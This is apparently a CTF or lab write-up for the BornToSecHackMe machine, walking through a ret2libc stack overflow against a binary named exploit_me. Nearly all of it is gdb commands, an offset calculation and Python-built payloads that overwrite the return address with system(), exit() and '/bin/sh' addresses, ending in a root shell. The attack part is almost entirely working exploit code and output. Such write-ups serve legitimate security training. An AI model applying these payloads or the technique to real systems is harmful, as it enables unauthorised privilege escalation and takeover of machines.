There is another way to exploit the exploit_me file.
We will use the ret2libc technique.
For that we need the address of the system function and the string "/bin/sh"

(gdb) p &system
$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>


(gdb) find __libc_start_main, +99999999, "/bin/sh"
0xb7f8cc58

We will overflow the return address to change it to a system call with /bin/sh as an argument.

We have to know the offset of overflow: 

zaz@BornToSecHackMe:~$ ./exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Segmentation fault (core dumped)

zaz@BornToSecHackMe:~$ dmesg | tail -1
[ 2584.618862] exploit_me[2379]: segfault at 37654136 ip 37654136 sp bffff690 error 14

37654136 = 140.

Just to be sure:

zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A" * 140 + "BBBB"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Segmentation fault (core dumped)
zaz@BornToSecHackMe:~$ dmesg | tail -1
[ 2694.053109] exploit_me[2395]: segfault at 42424242 ip 42424242 sp bffff6d0 error 14

So we have control of eip so we can set the system adresse.
After we have the return adress so we can put the exit adress but is not mandatory.
And after we have to put the /bin/sh adress.


		[--------offset--------] + [-----system----]  + [return] + [-----/bin/sh-----]

/exploit_me $(python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "OUAI"   + "\x58\xcc\xf8\xb7"')
# whoami
root
# exit
Segmentation fault (core dumped)


A better way is to use the exit address to quit without segfault:

		 [--------offset--------] + [-----system----]  + [------exit------] + [-----/bin/sh-----]
./exploit_me $(python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
# whoami
root
# exit
